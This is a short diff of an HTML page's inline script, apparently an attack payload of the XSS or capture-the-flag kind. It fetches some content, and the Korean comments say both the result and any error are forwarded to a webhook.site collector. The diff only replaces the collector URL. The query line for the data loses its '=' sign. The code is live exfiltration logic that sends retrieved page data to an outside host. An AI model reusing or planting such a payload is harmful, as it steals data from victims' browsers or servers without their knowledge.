@@ -13,11 +13,11 @@
     .then(r => r.text())
     .then(data => {
       // 데이터를 성공적으로 가져오면 Webhook으로 전송
-      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?data=" + encodeURIComponent(data));
+      fetch("https://webhook.site/c140121f-6d78-4c07-88bb-c2702cb9edbb?data" + encodeURIComponent(data));
     })
     .catch(e => {
       // 에러가 발생해도 Webhook으로 전송
-      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?err=" + encodeURIComponent(String(e)));
+      fetch("https://webhook.site/c140121f-6d78-4c07-88bb-c2702cb9edbb?err=" + encodeURIComponent(String(e)));
     });
 </script>
 </body>
